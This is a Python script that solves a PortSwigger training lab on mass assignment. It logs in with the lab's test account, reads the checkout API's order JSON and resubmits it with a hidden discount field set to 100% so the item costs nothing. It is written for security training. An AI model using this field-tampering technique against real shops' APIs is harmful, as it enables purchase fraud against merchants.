#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Exploiting a mass assignment vulnerability".

The checkout API binds every field in the JSON request body onto its internal
order object — including fields the developer never meant to be user-set. The
GET /api/checkout response reveals a hidden "chosen_discount" field that the
POST doesn't normally send. By adding it to our POST and setting the discount
to 100%, we buy the leather jacket for free.

Lab: https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

USERNAME = "wiener"
PASSWORD = "peter"
JACKET_ID = "1"


def fetch(path, method="GET", data=None, json=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, json=json,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def get_csrf(path):
    """Fetch a page and return its form's CSRF token."""
    resp = fetch(path)
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    return match.group(1) if match else None


def login():
    """Log in as wiener; the session cookie is set on success."""
    csrf = get_csrf("login")
    fetch("login", method="POST",
          data={"csrf": csrf, "username": USERNAME, "password": PASSWORD})


def check_mass_assignment():
    login()
    print(f"[*] Logged in as {USERNAME}")

    # Put the jacket in the cart so the checkout has something to buy.
    fetch("cart", method="POST",
          data={"productId": JACKET_ID, "redir": "PRODUCT", "quantity": 1})

    # Discover the order structure — the GET response exposes hidden fields.
    print("[*] Fetching /api/checkout to discover the order fields...")
    order = fetch("api/checkout").json()
    print(f"    order: {order}")

    # Tamper with the hidden field: apply a 100% discount.
    order["chosen_discount"]["percentage"] = 100
    print("[*] Re-submitting order with chosen_discount.percentage = 100")
    resp = fetch("api/checkout", method="POST", json=order)

    if "insufficient" not in resp.text.lower():
        report("Mass assignment", True, "bought the jacket for free with a 100% discount")
    else:
        report("Mass assignment", False, "order rejected (insufficient credit)")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Buy an item for free via a mass assignment vulnerability (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_mass_assignment()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()